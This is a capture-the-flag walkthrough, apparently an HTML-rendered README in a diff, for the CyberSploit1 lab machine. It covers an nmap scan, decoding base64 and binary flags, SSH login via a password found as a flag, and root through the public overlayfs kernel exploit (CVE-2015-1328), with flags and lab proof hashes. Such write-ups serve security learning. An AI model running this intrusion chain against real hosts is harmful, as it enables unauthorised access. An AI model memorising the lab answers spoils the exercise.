@@ -1,0 +1,156 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.43<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/CyberSploit1]<br/>
+└─# nmap -sC -sV 10.0.2.43 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 03:22 +0630<br/>
+Nmap scan report for 10.0.2.43<br/>
+Host is up (0.00014s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 1024 011bc8fe18712860846a9f303511663d (DSA)<br/>
+| &nbsp; 2048 d95314a37f9951403f49efef7f8b35de (RSA)<br/>
+|_ &nbsp;256 ef435bd0c0ebee3e76615c6dce15fe7e (ECDSA)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.2.22 ((Ubuntu))<br/>
+|_http-title: Hello Pentester!<br/>
+|_http-server-header: Apache/2.2.22 (Ubuntu)<br/>
+MAC Address: 08:00:27:12:26:06 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 9.94 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got 1st Flag from robots.txt encoded base64<br/>
+<br/>
+R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9<br/>
+<br/>
+decoded version:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9" | base64 -d<br/>
+Good Work !<br/>
+Flag1: cybersploit{youtube.com/c/cybersploit}<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found username from home page source code:<br/>
+<br/>
+&lt;!-------------username:itsskv---------------------&gt;<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+User Access<br/>
+<br/>
+At first, I tried bruteforce username "itsskv" with hydra using rockyou wordlist I wait between 20 or 30 minutes but it didn't find any valid password so I decided to stop bruteforce and tried using Flag1 as password. Boom! I got login into ssh. So, I just waste a few minute with bruteforcing -____-.<br/>
+<br/>
+ssh login<br/>
+<br/>
+username - itsskv<br/>
+password - cybersploit{youtube.com/c/cybersploit}<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh itsskv@10.0.2.43<br/>
+itsskv@10.0.2.43's password: <br/>
+Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)<br/>
+<br/>
+&nbsp;* Documentation: &nbsp;https://help.ubuntu.com/<br/>
+<br/>
+332 packages can be updated.<br/>
+273 updates are security updates.<br/>
+<br/>
+New release '14.04.6 LTS' available.<br/>
+Run 'do-release-upgrade' to upgrade to it.<br/>
+<br/>
+<br/>
+Your Hardware Enablement Stack (HWE) is supported until April 2017.<br/>
+<br/>
+Last login: Sat Jun 27 10:14:39 2020 from cybersploit.local<br/>
+itsskv@cybersploit-CTF:~$<br/>
+<br/>
+Got Flag2 <br/>
+<br/>
+itsskv@cybersploit-CTF:~$ cat flag2.txt <br/>
+01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101<br/>
+<br/>
+Binary to text translator:<br/>
+<br/>
+good work !<br/>
+flag2: cybersploit{https:t.me/cybersploit1}<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (kernel exploit 'overlayfs')<br/>
+<br/>
+After running linpeas, I found this machine is vulnerable into CVE:2015-1328 <br/>
+(Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation)<br/>
+<br/>
+https://www.exploit-db.com/exploits/37292<br/>
+<br/>
+Step 1<br/>
+<br/>
+I create C file with "nano exploit.c". Copy and paste the code into exploit.c<br/>
+<br/>
+Step 2<br/>
+<br/>
+gcc exploit.c -o exploit<br/>
+<br/>
+Step 3<br/>
+<br/>
+itsskv@cybersploit-CTF:/tmp$ ./exploit <br/>
+spawning threads<br/>
+mount #1<br/>
+mount #2<br/>
+child threads done<br/>
+/etc/ld.so.preload created<br/>
+creating shared library<br/>
+# whoami<br/>
+root<br/>
+<br/>
+Final Flag<br/>
+<br/>
+root@cybersploit-CTF:/root# cat finalflag.txt <br/>
+&nbsp; ______ ____ &nbsp; &nbsp;____ .______ &nbsp; &nbsp;_______ .______ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_______..______ &nbsp; &nbsp;__ &nbsp; &nbsp; &nbsp; &nbsp;______ &nbsp; &nbsp;__ &nbsp;.___________.<br/>
+&nbsp;/ &nbsp; &nbsp; &nbsp;|\ &nbsp; \ &nbsp;/ &nbsp; / | &nbsp; _ &nbsp;\ &nbsp;| &nbsp; ____|| &nbsp; _ &nbsp;\ &nbsp; &nbsp; &nbsp; &nbsp;/ &nbsp; &nbsp; &nbsp; || &nbsp; _ &nbsp;\ &nbsp;| &nbsp;| &nbsp; &nbsp; &nbsp;/ &nbsp;__ &nbsp;\ &nbsp;| &nbsp;| | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+| &nbsp;,----' \ &nbsp; \/ &nbsp; / &nbsp;| &nbsp;|_) &nbsp;| | &nbsp;|__ &nbsp; | &nbsp;|_) &nbsp;| &nbsp; &nbsp; &nbsp;| &nbsp; (----`| &nbsp;|_) &nbsp;| | &nbsp;| &nbsp; &nbsp; | &nbsp;| &nbsp;| &nbsp;| | &nbsp;| `---| &nbsp;|----`<br/>
+| &nbsp;| &nbsp; &nbsp; &nbsp; \_ &nbsp; &nbsp;_/ &nbsp; | &nbsp; _ &nbsp;&lt; &nbsp;| &nbsp; __| &nbsp;| &nbsp; &nbsp; &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp;\ &nbsp; \ &nbsp; &nbsp;| &nbsp; ___/ &nbsp;| &nbsp;| &nbsp; &nbsp; | &nbsp;| &nbsp;| &nbsp;| | &nbsp;| &nbsp; &nbsp; | &nbsp;| &nbsp; &nbsp; <br/>
+| &nbsp;`----. &nbsp; &nbsp;| &nbsp;| &nbsp; &nbsp; | &nbsp;|_) &nbsp;| | &nbsp;|____ | &nbsp;|\ &nbsp;\----.----) &nbsp; | &nbsp; | &nbsp;| &nbsp; &nbsp; &nbsp;| &nbsp;`----.| &nbsp;`--' &nbsp;| | &nbsp;| &nbsp; &nbsp; | &nbsp;| &nbsp; &nbsp; <br/>
+&nbsp;\______| &nbsp; &nbsp;|__| &nbsp; &nbsp; |______/ &nbsp;|_______|| _| `._____|_______/ &nbsp; &nbsp;| _| &nbsp; &nbsp; &nbsp;|_______| \______/ &nbsp;|__| &nbsp; &nbsp; |__| &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+&nbsp; &nbsp;_ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp; _ &nbsp;<br/>
+&nbsp; / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ <br/>
+&nbsp;( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )<br/>
+&nbsp; \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ <br/>
+<br/>
+flag3: cybersploit{Z3X21CW42C4 many many congratulations !}<br/>
+<br/>
+if you like it share with me https://twitter.com/cybersploit1.<br/>
+<br/>
+Thanks !<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+itsskv@cybersploit-CTF:~$ cat local.txt <br/>
+dae4a93665ab48d2290d85e02990a385<br/>
+<br/>
+root@cybersploit-CTF:/root# cat proof.txt <br/>
+3a8f0810912414c912eddee38d1109b4<br/>
+<br/>
+<br/>
+</body></html>
